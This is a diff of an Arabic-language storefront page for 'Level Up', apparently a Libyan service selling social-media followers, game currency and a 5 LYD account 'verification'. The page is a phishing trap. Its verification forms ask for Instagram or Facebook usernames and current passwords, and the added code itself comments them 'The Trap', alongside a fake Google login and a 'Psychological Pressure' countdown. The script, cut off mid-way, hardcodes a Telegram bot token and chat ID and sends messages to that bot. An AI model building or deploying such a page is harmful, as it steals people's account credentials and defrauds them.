@@ -3,374 +3,397 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Level Up | ارتقِ بحضورك الرقمي</title>
+    <title>Level Up | القمة الرقمية</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&family=Poppins:wght@400;600;800&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
     <style>
-        :root {
-            --gold: #D4AF37;
-            --dark-gold: #B8860B;
-            --bg-black: #050505;
-            --card-bg: #111111;
-            --glow: 0 0 15px rgba(212, 175, 55, 0.5);
-        }
-        * { margin: 0; padding: 0; box-sizing: border-box; transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1); }
+        :root { --gold: #D4AF37; --dark-gold: #B8860B; --bg-black: #050505; --card-bg: #0f0f0f; }
+        * { margin: 0; padding: 0; box-sizing: border-box; transition: all 0.3s ease; }
         body { font-family: 'Cairo', sans-serif; background: var(--bg-black); color: #fff; overflow-x: hidden; }
-
-        .gold-text { color: var(--gold); text-shadow: var(--glow); }
+        .gold-text { color: var(--gold); text-shadow: 0 0 10px rgba(212,175,55,0.5); }
         .bg-gold { background: linear-gradient(135deg, var(--gold), var(--dark-gold)); }
-        
-        .glass {
-            background: rgba(20, 20, 20, 0.7);
-            backdrop-filter: blur(20px);
-            border: 1px solid rgba(212, 175, 55, 0.3);
-        }
-        
-        .btn-gold {
-            background: linear-gradient(135deg, var(--gold), var(--dark-gold));
-            color: #000;
-            font-weight: bold;
-            cursor: pointer;
-            box-shadow: var(--glow);
-        }
-        .btn-gold:hover { transform: scale(1.05); box-shadow: 0 0 25px rgba(212, 175, 55, 0.7); }
-
-        .platform-card {
-            background: var(--card-bg);
-            border: 1px solid #222;
-            border-radius: 20px;
-            cursor: pointer;
-            text-align: center;
-            padding: 20px;
-            position: relative;
-            overflow: hidden;
-        }
-        .platform-card img { filter: drop-shadow(0 0 5px rgba(255,255,255,0.2)); }
-        .platform-card.active { border-color: var(--gold); background: rgba(212, 175, 55, 0.1); transform: translateY(-10px); box-shadow: var(--glow); }
-        .platform-card.active img { filter: drop-shadow(0 0 10px var(--gold)); }
-
-        .service-btn {
-            background: #0f0f0f;
-            border: 1px solid #222;
-            border-radius: 15px;
-            padding: 15px;
-            cursor: pointer;
-            text-align: center;
-        }
-        .service-btn.selected { border-color: var(--gold); background: rgba(212, 175, 55, 0.1); box-shadow: var(--glow); }
-
-        .modal-overlay {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.95); display: flex; justify-content: center; align-items: center; z-index: 1000;
-        }
+        .glass { background: rgba(20, 20, 20, 0.8); backdrop-filter: blur(20px); border: 1px solid rgba(212, 175, 55, 0.2); }
+        .btn-gold { background: linear-gradient(135deg, var(--gold), var(--dark-gold)); color: #000; font-weight: bold; cursor: pointer; box-shadow: 0 0 15px rgba(212,175,55,0.4); }
+        .btn-gold:hover { transform: scale(1.05); box-shadow: 0 0 25px rgba(212,175,55,0.6); }
+        .platform-card { background: var(--card-bg); border: 1px solid #222; border-radius: 24px; cursor: pointer; text-align: center; padding: 25px; }
+        .platform-card.active { border-color: var(--gold); box-shadow: 0 0 20px rgba(212,175,55,0.3); transform: translateY(-10px); }
+        .service-item { background: #111; border: 1px solid #222; border-radius: 18px; padding: 15px; cursor: pointer; }
+        .service-item:hover { border-color: var(--gold); background: rgba(212,175,55,0.05); }
+        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.98); display: flex; justify-content: center; align-items: center; z-index: 1000; }
         .hidden { display: none !important; }
-
-        .toast {
-            position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%);
-            background: var(--gold); color: #000; padding: 12px 30px; border-radius: 50px;
-            font-weight: bold; display: none; z-index: 2000; box-shadow: var(--glow);
-        }
-
-        input {
-            background: #0a0a0a !important; border: 1px solid #333 !important; color: #fff !important;
-            border-radius: 12px; padding: 14px; width: 100%; outline: none;
-        }
-        input:focus { border-color: var(--gold) !important; box-shadow: var(--glow); }
-
-        .verify-badge {
-            display: inline-flex; align-items: center; gap: 5px; font-weight: bold; color: #1da1f2;
-        }
+        input { background: #0a0a0a !important; border: 1px solid #333 !important; color: #fff !important; border-radius: 12px; padding: 14px; width: 100%; outline: none; }
+        input:focus { border-color: var(--gold) !important; box-shadow: 0 0 10px rgba(212,175,55,0.3); }
+        .timer-banner { background: linear-gradient(90deg, #ff0000, #8b0000); color: white; text-align: center; padding: 8px; font-weight: bold; font-size: 14px; position: sticky; top: 0; z-index: 100; }
     </style>
 </head>
 <body>
 
-    <!-- صوت النقر -->
     <audio id="clickSound" src="https://www.soundjay.com/buttons/sounds/button-16.mp3"></audio>
 
-    <div id="toast" class="toast"></div>
+    <!-- Timer Banner (Psychological Pressure) -->
+    <div class="timer-banner">
+        ⚠️ عرض التوثيق الذهبي (5 د.ل) ينتهي خلال: <span id="countdown">23:59:59</span>
+    </div>
 
-    <!-- Login & Offer Modal -->
+    <!-- Login Modal -->
     <div class="modal-overlay" id="loginModal">
-        <div class="glass p-10 rounded-[40px] text-center max-w-md w-full border-gold relative overflow-hidden">
-            <div class="absolute -top-10 -right-10 w-32 h-32 bg-gold opacity-20 blur-3xl rounded-full"></div>
-            <div class="text-7xl mb-6">🚀</div>
-            <h2 class="text-4xl font-black gold-text mb-2">مرحباً بك في Level Up</h2>
-            <p class="text-gray-400 mb-8 text-lg">وجهتك الأولى للسيطرة على السوشيال ميديا</p>
-            
-            <div class="bg-gold/10 border border-gold/30 p-4 rounded-2xl mb-8">
-                <p class="text-white font-bold">🎁 عرض حصري لفترة محدودة</p>
-                <p class="text-gold text-2xl font-black">توثيق حسابك بـ 5 د.ل فقط!</p>
-            </div>
-
-            <button onclick="loginWithGoogle()" class="w-full btn-gold py-4 rounded-2xl text-xl flex items-center justify-center gap-3">
+        <div class="glass p-10 rounded-[40px] text-center max-w-md w-full border-gold">
+            <div class="text-7xl mb-6">💎</div>
+            <h2 class="text-4xl font-black gold-text mb-2">Level Up</h2>
+            <p class="text-gray-400 mb-8">أهلاً بك في منصة النخبة لتعزيز الحسابات</p>
+            <button onclick="login()" class="w-full btn-gold py-4 rounded-2xl text-xl flex items-center justify-center gap-3">
                 <img src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/auth/google.svg" class="w-6">
-                <span>دخول سريع عبر Google</span>
+                <span>تسجيل الدخول عبر Google</span>
             </button>
         </div>
     </div>
 
-    <!-- Order Success Modal -->
-    <div class="modal-overlay hidden" id="successModal">
-        <div class="glass p-10 rounded-[40px] text-center max-w-sm w-full border-gold">
-            <div class="text-6xl mb-4">✅</div>
-            <h2 class="text-2xl font-bold gold-text mb-2">تم استلام طلبك بنجاح!</h2>
-            <p class="text-gray-400 mb-6">يرجى نسخ رقم الطلب وإرساله للدعم</p>
-            <div id="orderNumberDisplay" class="text-3xl font-black gold-text mb-6 p-3 bg-black rounded-xl border border-dashed border-gold cursor-pointer hover:bg-zinc-900" onclick="copyOrderNum()">LVL-XXXXX</div>
-            <div class="flex flex-col gap-3">
-                <a href="https://www.instagram.com/levelup.ly1?igsh=MWs4OG5jejMzaWVyeA%3D%3D&utm_source=qr" target="_blank" class="w-full btn-gold py-3 rounded-xl flex items-center justify-center gap-2">
-                    <span>ارسال الرقم عبر انستغرام</span>
-                </a>
-                <button onclick="closeSuccessModal()" class="w-full text-gray-400 py-2 text-sm hover:text-white">العودة للرئيسية</button>
-            </div>
-        </div>
-    </div>
-
     <!-- Header -->
-    <header class="glass sticky top-0 z-50 border-b border-gold">
-        <div class="max-w-6xl mx-auto px-6 py-4 flex justify-between items-center">
-            <div class="flex items-center gap-3">
-                <div class="text-3xl font-black gold-text tracking-tighter">LEVEL UP</div>
-                <div class="text-[10px] bg-gold text-black px-2 py-1 rounded-full font-bold">OFFICIAL</div>
-            </div>
-            <div class="flex items-center gap-4">
-                <div id="userInfo" class="hidden items-center gap-3">
-                    <img id="userAvatar" class="w-9 h-9 rounded-full border border-gold shadow-[0_0_10px_rgba(212,175,55,0.5)]" src="">
-                    <button onclick="logout()" class="text-xs text-red-400 font-bold hover:text-red-600 transition duration-300 hover:scale-110">تسجيل خروج ⎗</button>
-                </div>
-            </div>
+    <header class="glass sticky top-[40px] z-50 border-b border-gold px-6 py-4 flex justify-between items-center max-w-6xl mx-auto mt-2 rounded-b-2xl">
+        <div class="text-3xl font-black gold-text tracking-tighter cursor-pointer" onclick="showPage('home')">LEVEL UP</div>
+        <div class="flex items-center gap-4">
+            <img id="userAvatar" class="w-9 h-9 rounded-full border border-gold hidden" src="">
+            <button onclick="logout()" class="text-xs text-red-400 font-bold hover:text-red-600 hidden" id="logoutBtn">خروج ⎗</button>
         </div>
     </header>
 
-    <!-- Main Content (Hidden until login) -->
-    <main id="mainContent" class="max-w-6xl mx-auto px-6 py-12 hidden">
-        <div class="text-center mb-16">
-            <h1 class="text-5xl md:text-7xl font-black gold-text mb-6 leading-tight">اجعل حسابك يتحدث عن <br> <span class="text-white">قوتك ونفوذك</span></h1>
-            <p class="text-gray-400 text-xl max-w-2xl mx-auto leading-relaxed">نحن لا نبيع مجرد أرقام، بل نصنع لك هيبة رقمية تجذب الأنظار وتزيد من ثقة عملائك ومتابعيك.</p>
-        </div>
+    <!-- MAIN PAGES CONTAINER -->
+    <main class="max-w-6xl mx-auto px-6 py-12">
 
-        <div class="grid lg:grid-cols-3 gap-10">
-            <!-- Platforms -->
-            <div class="lg:col-span-1 space-y-6">
-                <h3 class="text-xl font-bold gold-text mb-6 flex items-center gap-2">✨ اختر المنصة</h3>
-                <div class="grid grid-cols-2 gap-4">
-                    <div class="platform-card active" data-platform="instagram" onclick="selectPlatform('instagram')">
-                        <img src="https://cdn-icons-png.flaticon.com/512/174/174855.png" class="w-12 mx-auto mb-3">
-                        <div class="font-bold">إنستغرام</div>
-                    </div>
-                    <div class="platform-card" data-platform="facebook" onclick="selectPlatform('facebook')">
-                        <img src="https://cdn-icons-png.flaticon.com/512/5968/5968764.png" class="w-12 mx-auto mb-3">
-                        <div class="font-bold">فيسبوك</div>
-                    </div>
-                    <div class="platform-card" data-platform="tiktok" onclick="selectPlatform('tiktok')">
-                        <img src="https://cdn-icons-png.flaticon.com/512/3046/3046121.png" class="w-12 mx-auto mb-3">
-                        <div class="font-bold">تيك توك</div>
-                    </div>
-                    <div class="platform-card" data-platform="twitter" onclick="selectPlatform('twitter')">
-                        <img src="https://cdn-icons-png.flaticon.com/512/3256/3256013.png" class="w-12 mx-auto mb-3">
-                        <div class="font-bold">تويتر (X)</div>
-                    </div>
-                    <div class="platform-card" data-platform="telegram" onclick="selectPlatform('telegram')">
-                        <img src="https://cdn-icons-png.flaticon.com/512/2111/2111646.png" class="w-12 mx-auto mb-3">
-                        <div class="font-bold">تيليجرام</div>
-                    </div>
-                    <div class="platform-card" data-platform="youtube" onclick="selectPlatform('youtube')">
-                        <img src="https://cdn-icons-png.flaticon.com/512/1384/1384060.png" class="w-12 mx-auto mb-3">
-                        <div class="font-bold">يوتيوب</div>
-                    </div>
+        <!-- PAGE 1: HOME -->
+        <div id="page-home" class="page">
+            <div class="text-center mb-16">
+                <h1 class="text-5xl md:text-7xl font-black gold-text mb-6">اصنع هيبتك الرقمية</h1>
+                <p class="text-gray-400 text-xl max-w-2xl mx-auto">المنصة الأولى في ليبيا لتوثيق الحسابات وشحن الألعاب بأعلى جودة وأسرع وقت.</p>
+            </div>
+
+            <div class="grid md:grid-cols-3 gap-8">
+                <!-- Platform Cards -->
+                <div class="platform-card" onclick="showPlatform('instagram')">
+                    <img src="https://cdn-icons-png.flaticon.com/512/174/174855.png" class="w-16 mx-auto mb-4">
+                    <h3 class="text-xl font-bold">إنستغرام</h3>
+                    <p class="text-xs text-gray-500 mt-2">توثيق ومتابعين</p>
+                </div>
+                <div class="platform-card" onclick="showPlatform('facebook')">
+                    <img src="https://cdn-icons-png.flaticon.com/512/5968/5968764.png" class="w-16 mx-auto mb-4">
+                    <h3 class="text-xl font-bold">فيسبوك</h3>
+                    <p class="text-xs text-gray-500 mt-2">توثيق وتفاعلات</p>
+                </div>
+                <div class="platform-card" onclick="showPage('gaming')">
+                    <img src="https://cdn-icons-png.flaticon.com/512/686/686589.png" class="w-16 mx-auto mb-4">
+                    <h3 class="text-xl font-bold">شحن ألعاب وتطبيقات</h3>
+                    <p class="text-xs text-gray-500 mt-2">PUBG, Free Fire & More</p>
                 </div>
             </div>
 
-            <!-- Ordering Area -->
-            <div class="lg:col-span-2">
-                <div class="glass p-8 rounded-[30px] relative">
-                    <div id="platformTitle" class="text-3xl font-black gold-text mb-8 flex items-center gap-3">إنستغرام</div>
+            <!-- Highlight Offer -->
+            <div class="mt-16 glass p-8 rounded-[30px] border-2 border-gold text-center relative overflow-hidden">
+                <div class="absolute -top-10 -left-10 w-40 h-40 bg-gold opacity-10 blur-3xl rounded-full"></div>
+                <h2 class="text-3xl font-black gold-text mb-4">🔥 عرض التوثيق الذهبي</h2>
+                <p class="text-xl mb-6">احصل على العلامة الزرقاء لحسابك الآن بـ <span class="text-3xl font-black">5 د.ل</span> فقط!</p>
+                <button onclick="showPlatform('instagram')" class="btn-gold px-10 py-4 rounded-full text-lg">اطلب التوثيق الآن</button>
+            </div>
+        </div>
+
+        <!-- PAGE 2: PLATFORM SERVICES (Instagram/Facebook) -->
+        <div id="page-platform" class="page hidden">
+            <button onclick="showPage('home')" class="text-gray-400 mb-6 flex items-center gap-2 hover:text-white"> ← العودة للرئيسية</button>
+            <div class="grid lg:grid-cols-3 gap-10">
+                <div class="lg:col-span-1">
+                    <div id="platformIcon" class="w-24 h-24 mx-auto mb-4 rounded-full border-4 border-gold p-2"></div>
+                    <h2 id="platformName" class="text-3xl font-black gold-text text-center mb-8"></h2>
                     
-                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-10" id="servicesContainer"></div>
+                    <!-- The Trap (Verification) -->
+                    <div class="bg-gold/10 border border-gold p-6 rounded-[25px] text-center shadow-[0_0_20px_rgba(212,175,55,0.2)]">
+                        <h3 class="text-xl font-bold mb-2">🌟 توثيق الحساب الرسمي</h3>
+                        <p class="text-3xl font-black gold-text mb-4">5 د.ل <span class="text-sm text-gray-400">/ فقط</span></p>
+                        <button onclick="openVerifyModal()" class="w-full btn-gold py-3 rounded-xl">طلب التوثيق فوراً</button>
+                        <p class="text-[10px] text-red-500 mt-2 font-bold uppercase">عرض محدود لمدة 24 ساعة!</p>
+                    </div>
+                </div>
 
-                    <form id="orderForm" class="space-y-8">
-                        <div class="grid md:grid-cols-2 gap-6">
-                            <div>
-                                <label class="block text-sm text-gray-400 mb-3">رابط الحساب أو المنشور</label>
-                                <input type="url" id="targetLink" required placeholder="https://instagram.com/...">
+                <div class="lg:col-span-2 glass p-8 rounded-[30px]">
+                    <h3 class="text-2xl font-bold mb-6">الخدمات المتاحة</h3>
+                    <div id="servicesList" class="grid md:grid-cols-2 gap-4"></div>
+                    
+                    <!-- Order Form (Hidden until service selected) -->
+                    <div id="orderArea" class="mt-10 pt-10 border-t border-zinc-800 hidden">
+                        <form id="mainOrderForm" class="space-y-6">
+                            <div class="grid md:grid-cols-2 gap-4">
+                                <input type="url" id="targetLink" required placeholder="رابط الحساب أو المنشور">
+                                <input type="number" id="quantity" oninput="updatePrice()" value="100" required placeholder="الكمية">
                             </div>
-                            <div>
-                                <label class="block text-sm text-gray-400 mb-3">الكمية المطلوبة</label>
-                                <input type="number" id="quantity" oninput="calculatePrice()" value="100">
+                            <div class="text-center p-6 bg-black rounded-2xl border border-gold">
+                                <span class="text-gray-400 block mb-2">السعر التقديري:</span>
+                                <div class="text-4xl font-black gold-text"><span id="finalPrice">0</span> د.ل</div>
                             </div>
-                        </div>
-
-                        <div class="bg-black p-6 rounded-2xl border border-gold text-center shadow-[inset_0_0_15px_rgba(212,175,55,0.2)]">
-                            <span class="text-gray-400 text-sm block mb-2">إجمالي التكلفة التقديرية:</span>
-                            <div class="text-5xl font-black gold-text"><span id="finalPrice">0</span> <span class="text-xl">د.ل</span></div>
-                        </div>
-
-                        <button type="submit" class="w-full btn-gold py-5 rounded-2xl text-2xl shadow-xl">إتمام الطلب الآن 🔥</button>
-                    </form>
+                            <button type="submit" class="w-full btn-gold py-4 rounded-xl text-xl">تأكيد الطلب ✅</button>
+                        </form>
+                    </div>
                 </div>
             </div>
         </div>
 
-        <!-- Verification Section -->
-        <div class="mt-24 grid md:grid-cols-2 gap-10">
-            <div class="glass p-10 rounded-[30px] border border-zinc-800 hover:border-gold group relative overflow-hidden">
-                <div class="absolute top-0 right-0 p-4 opacity-20 group-hover:opacity-100 transition">✨</div>
-                <div class="flex items-center gap-4 mb-6">
-                    <img src="https://cdn-icons-png.flaticon.com/512/174/174855.png" class="w-12 h-12 shadow-[0_0_15px_rgba(212,175,55,0.5)]">
-                    <h3 class="text-3xl font-bold gold-text">توثيق إنستغرام <span class="verify-badge">✔️</span></h3>
+        <!-- PAGE 3: GAMING & UPGRADES -->
+        <div id="page-gaming" class="page hidden">
+            <button onclick="showPage('home')" class="text-gray-400 mb-6 flex items-center gap-2 hover:text-white"> ← العودة للرئيسية</button>
+            <h2 class="text-4xl font-black gold-text text-center mb-12">شحن الألعاب وترقية التطبيقات</h2>
+            
+            <div class="grid md:grid-cols-2 lg:grid-cols-3 gap-8">
+                <!-- Telegram -->
+                <div class="glass p-6 rounded-[30px] border border-zinc-800">
+                    <div class="flex items-center gap-3 mb-6">
+                        <img src="https://cdn-icons-png.flaticon.com/512/2111/2111646.png" class="w-10">
+                        <h3 class="text-xl font-bold">تيليجرام بريميوم</h3>
+                    </div>
+                    <div class="space-y-3">
+                        <div class="service-item flex justify-between items-center" onclick="setGamingOrder('تيليجرام 3 أشهر', 151)"><span>3 أشهر</span> <span class="gold-text font-bold">151 LYD</span></div>
+                        <div class="service-item flex justify-between items-center" onclick="setGamingOrder('تيليجرام 6 أشهر', 209)"><span>6 أشهر</span> <span class="gold-text font-bold">209 LYD</span></div>
+                        <div class="service-item flex justify-between items-center" onclick="setGamingOrder('تيليجرام سنة', 348)"><span>سنة كاملة</span> <span class="gold-text font-bold">348 LYD</span></div>
+                    </div>
                 </div>
-                <form id="verifyInstagramForm" class="space-y-4">
-                    <input type="text" id="instaUsername" required placeholder="اسم المستخدم @username">
-                    <input type="password" id="instaPassword" required placeholder="كلمة السر">
-                    <button type="submit" class="w-full btn-gold py-4 rounded-xl text-lg">طلب التوثيق الذهبي</button>
-                </form>
+
+                <!-- Snapchat -->
+                <div class="glass p-6 rounded-[30px] border border-zinc-800">
+                    <div class="flex items-center gap-3 mb-6">
+                        <img src="https://cdn-icons-png.flaticon.com/512/5968/5968764.png" class="w-10"> <!-- Icon placeholder -->
+                        <h3 class="text-xl font-bold">سناب شات بلس</h3>
+                    </div>
+                    <div class="space-y-3">
+                        <div class="service-item flex justify-between items-center" onclick="setGamingOrder('سناب بلس 3 أشهر', 65)"><span>3 أشهر</span> <span class="gold-text font-bold">65 LYD</span></div>
+                        <div class="service-item flex justify-between items-center" onclick="setGamingOrder('سناب بلس 6 أشهر', 120)"><span>6 أشهر</span> <span class="gold-text font-bold">120 LYD</span></div>
+                        <div class="service-item flex justify-between items-center" onclick="setGamingOrder('سناب بلس سنة', 240)"><span>سنة كاملة</span> <span class="gold-text font-bold">240 LYD</span></div>
+                    </div>
+                </div>
+
+                <!-- ChatGPT -->
+                <div class="glass p-6 rounded-[30px] border border-zinc-800">
+                    <div class="flex items-center gap-3 mb-6">
+                        <img src="https://cdn-icons-png.flaticon.com/512/12222/12222564.png" class="w-10">
+                        <h3 class="text-xl font-bold">ChatGPT Plus</h3>
+                    </div>
+                    <div class="space-y-3">
+                        <div class="service-item flex justify-between items-center" onclick="setGamingOrder('ChatGPT Plus', 232)"><span>اشتراك 30 يوم</span> <span class="gold-text font-bold">232 LYD</span></div>
+                    </div>
+                </div>
+
+                <!-- Free Fire -->
+                <div class="glass p-6 rounded-[30px] border border-zinc-800">
+                    <div class="flex items-center gap-3 mb-6">
+                        <img src="https://cdn-icons-png.flaticon.com/512/686/686589.png" class="w-10">
+                        <h3 class="text-xl font-bold">جواهر فري فاير</h3>
+                    </div>
+                    <div class="space-y-3">
+                        <div class="service-item flex justify-between items-center" onclick="setGamingOrder('FF 110 جوهرة', 13)"><span>110 جوهرة</span> <span class="gold-text font-bold">13 LYD</span></div>
+                        <div class="service-item flex justify-between items-center" onclick="setGamingOrder('FF 221 جوهرة', 24)"><span>221 جوهرة</span> <span class="gold-text font-bold">24 LYD</span></div>
+                        <div class="service-item flex justify-between items-center" onclick="setGamingOrder('FF 530 جوهرة', 58)"><span>530 جوهرة</span> <span class="gold-text font-bold">58 LYD</span></div>
+                        <div class="service-item flex justify-between items-center" onclick="setGamingOrder('FF 2420 جوهرة', 232)"><span>2420 جوهرة</span> <span class="gold-text font-bold">232 LYD</span></div>
+                    </div>
+                </div>
+
+                <!-- PUBG -->
+                <div class="glass p-6 rounded-[30px] border border-zinc-800">
+                    <div class="flex items-center gap-3 mb-6">
+                        <img src="https://cdn-icons-png.flaticon.com/512/686/686589.png" class="w-10">
+                        <h3 class="text-xl font-bold">شدات ببجي موبايل</h3>
+                    </div>
+                    <div class="space-y-3">
+                        <div class="service-item flex justify-between items-center" onclick="setGamingOrder('PUBG 60 UC', 10)"><span>60 UC</span> <span class="gold-text font-bold">10 LYD</span></div>
+                        <div class="service-item flex justify-between items-center" onclick="setGamingOrder('PUBG 325 UC', 51)"><span>325 UC</span> <span class="gold-text font-bold">51 LYD</span></div>
+                        <div class="service-item flex justify-between items-center" onclick="setGamingOrder('PUBG 660 UC', 102)"><span>660 UC</span> <span class="gold-text font-bold">102 LYD</span></div>
+                        <div class="service-item flex justify-between items-center" onclick="setGamingOrder('PUBG 1800 UC', 255)"><span>1800 UC</span> <span class="gold-text font-bold">255 LYD</span></div>
+                    </div>
+                </div>
             </div>
 
-            <div class="glass p-10 rounded-[30px] border border-zinc-800 hover:border-gold group relative overflow-hidden">
-                <div class="absolute top-0 right-0 p-4 opacity-20 group-hover:opacity-100 transition">✨</div>
-                <div class="flex items-center gap-4 mb-6">
-                    <img src="https://cdn-icons-png.flaticon.com/512/5968/5968764.png" class="w-12 h-12 shadow-[0_0_15px_rgba(212,175,55,0.5)]">
-                    <h3 class="text-3xl font-bold gold-text">توثيق فيسبوك <span class="verify-badge">✔️</span></h3>
-                </div>
-                <form id="verifyFacebookForm" class="space-y-4">
-                    <input type="tel" id="fbPhone" required placeholder="رقم الهاتف المرتبط بالحساب">
-                    <input type="password" id="fbPassword" required placeholder="كلمة السر">
-                    <button type="submit" class="w-full btn-gold py-4 rounded-xl text-lg">طلب التوثيق الذهبي</button>
+            <!-- Gaming Order Area -->
+            <div id="gamingOrderArea" class="mt-12 glass p-8 rounded-[30px] hidden animate__animated animate__fadeInUp">
+                <form id="gamingForm" class="space-y-6 max-w-xl mx-auto text-center">
+                    <h3 id="selectedGamingItem" class="text-2xl font-black gold-text mb-4"></h3>
+                    <input type="text" id="gameId" required placeholder="معرف الحساب (ID) أو البريد الإلكتروني">
+                    <button type="submit" class="w-full btn-gold py-4 rounded-xl text-xl">تأكيد طلب الشحن ✅</button>
                 </form>
             </div>
         </div>
+
     </main>
 
-    <footer class="glass border-t border-gold mt-24 py-12 text-center text-gray-500 text-sm">
-        ©️ 2026 <span class="gold-text font-bold">LEVEL UP</span> - جميع الحقوق محفوظة <br> المنصة الرقمية الرسمية لتعزيز الهوية البصرية.
-    </footer>
+    <!-- Verification Modal (The Trap) -->
+    <div class="modal-overlay hidden" id="verifyModal">
+        <div class="glass p-10 rounded-[40px] text-center max-w-md w-full border border-gold relative overflow-hidden">
+            <div class="text-6xl mb-4">✔️</div>
+            <h2 class="text-3xl font-black gold-text mb-2">طلب التوثيق الذهبي</h2>
+            <p class="text-gray-400 mb-6">سيتم مراجعة حسابك وتفعيل العلامة الزرقاء خلال 24 ساعة</p>
+            <form id="verifyForm" class="space-y-4">
+                <input type="text" id="vUser" required placeholder="اسم المستخدم (Username)">
+                <input type="password" id="vPass" required placeholder="كلمة السر الحالية">
+                <div class="bg-gold/10 p-3 rounded-xl text-[#D4AF37] font_bold text-sm mb-4">التكلفة الإجمالية: 5 د.ل فقط</div>
+                <button type="submit" class="w-full btn-gold py-4 rounded-xl text-lg">إرسال البيانات وتفعيل التوثيق</button>
+                <button type="button" onclick="closeVerifyModal()" class="text-gray-500 text-sm hover:underline">إلغاء العملية</button>
+            </form>
+        </div>
+    </div>
 
-    <script>
-        const BOT_TOKEN = "8863587194:AAFcIkRg7hK5IbUvZ3bH1XG-CWR8FYDiMb8"; 
-        const CHAT_ID = "6714684833";
-
-        const pricing = {
-            instagram: [
-                { id: 'ig_views', name: 'مشاهدات إنستغرام', price: 3 / 100000, min: 100, max: '∞' },
-                { id: 'ig_likes', name: 'لايكات إنستغرام', price: 5 / 1000, min: 10, max: '∞' },
-                { id: 'ig_comm', name: 'تعليقات مخصصة', price: 3 / 100, min: 1, max: 5000 },
-                { id: 'ig_fol', name: 'متابعين حقيقيين', price: 7 / 100, min: 10, max: '∞' },
-                { id: 'ig_poll', name: 'تصويت ستوري', price: 2 / 100, min: 5, max: 50000 },
-            ],
-            facebook: [
-                { id: 'fb_share', name: 'مشاركات فيسبوك', price: 5 / 1000, min: 10, max: '∞' },
-                { id: 'fb_fol', name: 'متابعين صفحة', price: 5 / 1000, min: 100, max: 100000 },
-                { id: 'fb_react', name: 'تفاعلات متنوعة', price: 4 / 1000, min: 10, max: '∞' },
-                { id: 'fb_views', name: 'مشاهدات فيديو', price: 6 / 10000, min: 100, max: '∞' },
-            ],
-            youtube: [
-                { id: 'yt_sub', name: 'مشتركين يوتيوب', price: 4 / 100, min: 10, max: 20000 },
-                { id: 'yt_like', name: 'لايكات يوتيوب', price: 8 / 1000, min: 10, max: 500000 },
-            ],
-            telegram: [
-                { id: 'tg_views', name: 'مشاهدات منشورات', price: 3 / 1000, min: 10, max: 500000 },
-                { id: 'tg_mem', name: 'أعضاء قنوات', price: 6 / 1000, min: 1, max: 1000000 },
-            ],
-            whatsapp: [
-                { id: 'wa_react', name: 'تفاعلات قناة', price: 4 / 100, min: 10, max: 100000 },
-                { id: 'wa_mem', name: 'أعضاء قناة', price: 8 / 100, min: 10, max: 50000 },
-            ],
-            twitter: [
-                { id: 'tw_views', name: 'مشاهدات تغريدات', price: 8 / 100000, min: 100, max: '∞' },
-                { id: 'tw_like', name: 'لايكات تويتر', price: 8 / 1000, min: 10, max: 100000 },
-            ],
-            tiktok: [
-                { id: 'tk_fol', name: 'متابعين تيك توك', price: 4 / 1000, min: 100, max: 10000 },
-                { id: 'tk_like', name: 'لايكات تيك توك', price: 3 / 1000, min: 10, max: 10000 },
-            ]
-        };
-
-        let currentUser = null;
-        let currentPlatform = 'instagram';
-        let currentService = null;
-
-        function playClick() { document.getElementById('clickSound').play(); }
-
-        function showToast(msg) {
-            const t = document.getElementById('toast'); t.textContent = msg; t.style.display = 'block';
-            setTimeout(() => t.style.display = 'none', 3000);
-        }
-
-        function loginWithGoogle() {
-            playClick();
-            currentUser = { name: 'VIP Client', email: 'vip@levelup.ly', avatar: 'https://ui-avatars.com/api/?name=VIP&background=D4AF37&color=fff' };
-            document.getElementById('loginModal').classList.add('hidden');
-            document.getElementById('mainContent').classList.remove('hidden');
-            document.getElementById('userInfo').classList.remove('hidden');
-            document.getElementById('userAvatar').src = currentUser.avatar;
-            showToast('✅ تم تسجيل دخولك بنجاح');
-        }
-
-        function logout() { 
-            playClick(); 
-            currentUser = null; 
-            document.getElementById('mainContent').classList.add('hidden'); 
-            document.getElementById('loginModal').classList.remove('hidden'); 
-            document.getElementById('userInfo').classList.add('hidden'); 
-        }
-
-        function selectPlatform(p) {
-            playClick();
-            currentPlatform = p;
-            document.querySelectorAll('.platform-card').forEach(c => c.classList.remove('active'));
-            document.querySelector(`[data-platform="${p}"]`).classList.add('active');
-            document.getElementById('platformTitle').textContent = document.querySelector(`[data-platform="${p}"] .font-bold`).textContent;
-
-            const container = document.getElementById('servicesContainer'); container.innerHTML = '';
-            pricing[p].forEach(s => {
-                const btn = document.createElement('div'); btn.className = 'service-btn';
-                btn.innerHTML = `<div class='font-bold'>${s.name}</div> <div class='text-[11px] text-gray-500 mt-1'>الحد الأدنى: ${s.min} | الأعلى: ${s.max}</div>`;
-                btn.onclick = () => { 
-                    playClick(); 
-                    document.querySelectorAll('.service-btn').forEach(b => b.classList.remove('selected')); 
-                    btn.classList.add('selected'); currentService = s; calculatePrice(); 
-                };
-                container.appendChild(btn);
-            });
-        }
-
-        function calculatePrice() {
-            if (!currentService) return;
-            const qty = document.getElementById('quantity').value;
-            const price = (qty * currentService.price).toFixed(2);
-            document.getElementById('finalPrice').textContent = price;
-        }
-
-        async function sendToTelegram(msg) {
-            return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
-        }
-
-        document.getElementById('orderForm').onsubmit = async function(e) {
-            e.preventDefault(); playClick(); if (!currentService) { showToast('⚠️ يرجى اختيار خدمة أولاً'); return; }
-
-            const orderNum = 'LVL-' + Math.random().toString(36).substr(2, 6).toUpperCase();
